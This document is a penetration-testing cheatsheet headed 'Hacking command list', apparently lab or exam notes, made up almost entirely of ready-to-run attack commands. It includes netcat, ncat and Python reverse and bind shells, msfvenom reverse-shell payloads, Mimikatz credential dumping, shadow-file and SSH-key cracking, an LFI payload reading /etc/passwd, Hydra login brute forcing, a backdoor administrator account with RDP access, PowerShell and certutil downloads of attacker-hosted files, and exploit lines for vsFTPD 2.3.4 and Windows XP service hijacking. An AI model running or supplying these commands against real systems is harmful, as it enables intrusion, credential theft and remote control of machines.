---
description: Hacking command list
---

# Command cheatsheet

### Netcat

Connect to port

```text
nc -nv 192.168.1.10 110
```

Bind port and connect to:

```text
nc -nlvp 4444
nc -nv 192.168.1.10 4444
```

Copy files

```text
nc -nlvp 4444 > dest-file
nc -nv 192.168.1.10 4444 < local-file
```

Bind shell and remote execution

```text
nc -nlvp 4444 -e cmd.exe
nc -nv 192.168.1.10 4444
```

Reverse shell

```text
nc -nlvp 4444
nc -nv 192.168.1.10 4444 -e /bin/bash
```

Scan ports

```text
nc -nvv -w 1 -z 192.168.1.10 3388-3390
```

### Ncat

Bind shell SSL with allow IP address

```text
ncat --exec cmd.exe --allow 192.168.1.11 -vnl 4444 --ssl
ncat -v 192.168.1.10 4444 --ssl
```

Reverse shell SSL

```text
ncat -vnl 4444 --ssl
ncat -nv 192.168.1.10 4444 --ssl --exec /bin/bash
```

### Tcpdump

Load a .pcap file

```text
tcpdump -r file.pcap
```

Filter by source host

```text
tcpdump -n src host 172.16.40.10
```

Filter by destination host

```text
tcpdump -n dst host 172.16.40.10
```

Filter by port

```text
tcpdump -n port 80
```

Print packet data in HEX and ASCI

```text
tcpdump -nXX
```

Packets with ACK or PSH flags set

```text
tcpdump -A -n 'tcp[13] = 24'
```

Print HEX data on an 1500 MTU card

```text
tcpdump -i tap0 -nXX -s 1500 port 110
```

### The harvester

Search all sources for email

```text
theharvester -d domain.com -b all
```

Search employees on linkedin

```text
theharvester -d domain.com -b linkedin
```

Search emails and query hosts in shodan

```text
theharvester -d domain.com -b bing -h
```

### host

Find name servers

```text
host -t ns domain.com
```

Find mail servers

```text
host -t mx domain.com
```

Find address and mail servers

```text
host domain.com
```

Reverse lookup

```text
host 1.2.3.4
```

Transfer DNS zone

```text
host -l domain.com domain-nameserver.com
```

Try all NS DNS zone transfer

```text
HOST=host.com; for ns in $(host -t ns $HOST | awk '{print $4}'); do host -l $HOST $ns | grep "has address" ; done
```

### dnsrecon

Try DNS zone transfer

```text
dnsrecon -d domain.com -t axfr
```

### dnsenum

Enumerate host in a domain

```text
dnsenum domain.com
```

### Nmap

TCP syn/ack scan

```text
nmap -sT 10.11.11.123
```

Scan all ports

```text
nmap -sS 1.1.1.1 -p-
```

Identify host in the network \(ICMP\)

```text
nmap -sn -v 10.11.1.1-254 -oG host.txt
```

Scan port 80 on all hosts

```text
nmap -p 80 10.11.1.1-254 -oG web-host.txt
```

OS, port, version, traceroute and script scan of top 20 port in a range

```text
nmap -sT -A -top-ports=20 10.11.1.1-254 -oG top-ports.txt
```

OS scan

```text
nmap -O 10.11.11.123
```

Service Version scan

```text
nmap -sV -sT 10.11.11.123
```

Script discover nsb and host version

```text
nmap 10.11.11.123 -p 139,445 --script smb-os-discovery.nse
```

Script DNS zone transfer

```text
nmap --script dns-zone-transfer -p 53 ns2.domain.com
```

Scan for smb services \(139-netbios,445-microsoft-ds\)

```text
nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
```

Enum http path

```text
nmap -v -p 80 192.168.56.101 --script http-enum.ns
```

### SMB

Discover SMB hosts in a network, get IP, NetBIOS name and users

```text
nbtscan -r 10.11.1.0/24
```

Discover SMB host info

```text
enum4linux -a 10.11.1.227
```

Search specific vulnerability

```text
nmap -v -p139,445 --script smb-vuln-ms08-067 --script-args=unsafe=1 10.13.10.4
```

Enumerate shares

```text
nmap --script smb-enum-shares 10.13.10.4 -p139,445 -T4
```

Map smb shares

```text
smbmap -H 10.14.15.16 -u guest
```

Mount share

```text
mount -t cifs -o vers=1.0,username=guest,password="" //10.11.12.13/wwwroot /tmp/path
```

### SMTP

Connect smtp

```text
nc -nv 192.168.56.101 25
# Check if user exists
VRFY root
```

### SNMP

* Port: 161
* Type: UDP

Scan strings \[community, public, manager, etc\]

```text
onesixtyone -c snmp_strings.txt 127.0.0.1
```

Enumerate MIB tree

```text
snmpwalk -c public -v1 127.0.0.1
```

Enumerate some SMTP OID

```text
snmpwalk -c <COMMUNITY_STRING> <version> <HOST> <OID>
```

### msfvenom

PHP reverse shell

```text
msfvenom -p php/reverse_php LHOST=10.11.0.49 LPORT=443 -f raw > shell.php
```

Windows bind port \(No firewall enabled\)

```text
msfvenom -p windows/shell_bind_tcp R LPORT=4446 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

Microsoft ASP .net reverse shell

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.49 LPORT=4445 -f asp > shell.asp
```

Create windows executable

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.49 LPORT=8080 -f exe -e x86/shikata_ga_nai -i 9 -o httpd.exe
```

### GCC / compilation

Regular compilation

```text
gcc -o OpenFuck 47080.c -lcrypto
```

Cross compile x86 in x86\_64 host

```text
gcc -Wall -o <out_file> <exploit.c> -m32 -march=i686 -Wl,--hash-style=both
gcc -m32 -Wl,--hash-style=both -o udev udev.c
```

### Nikto

Analise web with default settings

```text
nikto -host http://10.11.1.10
```

### dirb

Scan web service directories and files

```text
dirb http://192.168.1.10
```

Scan non recursively, non show attempts and bigger words list

```text
dirb http://192.168.1.10 /usr/share/dirb/wordlists/big.txt -r -S
```

### FTP

Non interactive FTP download from windows

```text
echo open 10.11.0.49 21 > ftp.txt
echo USER xnaaro >> ftp.txt
echo 12345>> ftp.txt
echo bin >> ftp.txt
echo GET wget.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

### Mimikatz

Non interactive hash dump

```text
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
```

### Webserver

Create a python webserver

```text
python -m SimpleHTTPServer 80
```

### Searchsploit

Search exploit

```text
searchsploit <name>
```

See exploit code

```text
searchsploit -x /path/exploit
```

Copy exploit current location

```text
searchsploit -m path/exploit
```

### John the ripper

Merge passwd and shadow files

```text
unshadow /etc/passwd /etc/shadow > unshadow.txt
```

Crack passwords

```text
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadow_pass.txt
```

Crack SSH key passphrase

```text
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
```

### hashcat

Crack linux passwords

```text
hashcat -m 1800 -O passwd.hash /usr/share/wordlists/rockyou.txt --force
```

### File inclusion

LFI example

```text
http://10.12.13.14/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00
```

### Shells

Python interactive bash shell

```text
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm && export SHELL=bash
```

Scape restricted shell: `-rbash: /usr/bin/python: restricted: cannot specify '/' in command names`

```text
BASH_CMDS[a]=/bin/sh;a
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
```

Python reverse shell

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.49",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Mysql

Non interactive queries

```text
mysql -u <user> -p<passwd> -D otrs -e "show databases;"
```

### Robots.txt

Crawl robots txt as a search engine agent

```text
curl --user-agent Googlebot http://10.11.12.13/robots.txt -v
```

### Hydra

Generate passwds from web words

```text
cewl http://10.11.12.13 -m 2 -w output
```

Brute force logging

```text
hydra -L usernames.txt -P passwords.txt <IP>  <MODE> "<PATH>:Action=<HTTP_QUERY>&User=^USER^&Password=^PASS^:<ERROR message when fail"
# Example
hydra -L usernames -P output 10.11.12.13  http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=300&User=^USER^&Password=^PASS^:F=Login"
```

## Fuzzing

### ffuz

Silent fuzzing

```text
ffuf -s -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.168:8080/FUZZ
```

### Whatweb

```text
$ whatweb http://10.10.10.168:8080   
http://10.10.10.168:8080 [200 OK] Country[RESERVED][ZZ], Email[secure@obscure.htb], HTML5, HTTPServer[BadHTTPServer], IP[10.10.10.168], JQuery, Script, Title[0bscura], X-UA-Compatible[IE=Edge]

```

## Windows commands

Create admin user with RDP

```text
net user xnaaro 12345 /add
net localgroup administrators xnaaro /add
net localgroup "Remote Desktop Users" xnaaro /add
```

Quick local enumeration

```text
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```

### Downloads

Download file with powershell

* Option 1

```text
echo (New-Object System.Net.WebClient).DownloadFile("http://10.11.0.49/wget.exe", "wget.exe") > wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

* Option 2

```text
PowerShell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.49/wget.exe','wget.exe')
```

Non interactive download

```text
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.49/wget.exe" >>wget.ps1
echo $file = "wget.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

Download file with certutil

```text
certutil -urlcache -split -f "http://10.11.0.49/wget.exe" wget.exe
```

### Windows exploit suggester

Copy systeminfo to local host

```text
./windows-exploit-suggester.py --database 2019-11-29-mssb.xls --systeminfo /tmp/systeminfo
```

### Well know exploits

* Ubuntu 11 - CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 \(Gentoo / Ubuntu x86/x64\)
* Windows compiled exploits repo [https://github.com/SecWiki/windows-kernel-exploits.git](https://github.com/SecWiki/windows-kernel-exploits.git)

## Common vulnerabilities

### vsFTPD 2.3.4

Exploit and reverse shell

```text
python3 vsftpd_234_exploit.py 192.168.56.101 21 "sh -c 'nc -nv 192.168.56.1 44444 -e /bin/bash > /dev/null 2>&1 &'"
```

### Windows XP SP1 priv escalation

```text
sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe 10.11.0.49 10000 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
```

